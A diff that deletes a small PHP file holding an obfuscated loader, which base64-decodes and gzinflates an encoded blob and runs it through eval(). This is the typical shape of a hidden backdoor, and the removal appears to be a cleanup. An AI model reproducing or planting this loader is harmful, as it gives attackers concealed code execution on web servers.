@@ -1,4 +1,0 @@
-<?php
-function xshikata($z){$b=base64_decode($z);$c=gzinflate($b);if($c)eval($c);}
-xshikata('TY9RasMwEETPkiAiCYwdNyGQGDn56iVKEa6yqgWyZKx142J898pqKP1aHjuzM0tGQVvEPlyKIiD0ne/a8SNXvisOOU5IK6LETRsL8hNQKu8QHAZGRl4ZzTZE8TlOPTqFxjsJkwlxTdU4WGmcQcr5TFrxx8mZKAD6HmUzDM03I232Vp7P5UHUZXY6inr/ztfopIQJVFQ8fcr6AAmX3wa7XTy81mO0sdY/5KrSvgf3DL8liMkZHWjqHd3zo41fsY0Gn5gTlQs9QHNfy5T7lyOv9L+sZSHqCl+NZdtrTdSWX+4GGH1tjI03fwA=');
-?>
